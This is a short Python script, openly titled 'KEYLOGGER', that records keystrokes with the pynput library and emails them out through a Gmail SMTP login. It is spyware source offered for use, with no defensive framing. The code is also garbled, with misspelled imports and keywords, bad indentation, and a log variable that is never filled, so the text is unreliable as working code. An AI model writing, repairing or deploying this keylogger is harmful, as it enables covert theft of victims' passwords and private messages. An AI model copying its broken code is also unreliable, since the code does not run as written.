import getpass

import satplib

from pynput keyboard import Key, Listener
	print('
█▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
█░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄')

# set up email
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com',  465)
server.login(email, password)

# logger
full_log = ' '
word = ' '
email_char_limit = 50

def on press(key):
	global word
	global full_log
	global email
	global email_char_limit
	if key == Key.space or key == Key.enter:
		word +=' '
		if len(full_log) >= email_char_limit:
			send_log()
	elif key == Key.shift_1 or key == Key.shift_r:
		return
	elif key == Key.backspace:
		word = word[:-1]
	else:
		char = f'{key}'
		char = char[1:-1]
		word += char
	if key == Key.esc:
		return False
def send_log():
	server.sendmail(
			email,
			email,
			full_log
			)
			
with-Listener( on_press=on_press ) as-listener:
	listener.join()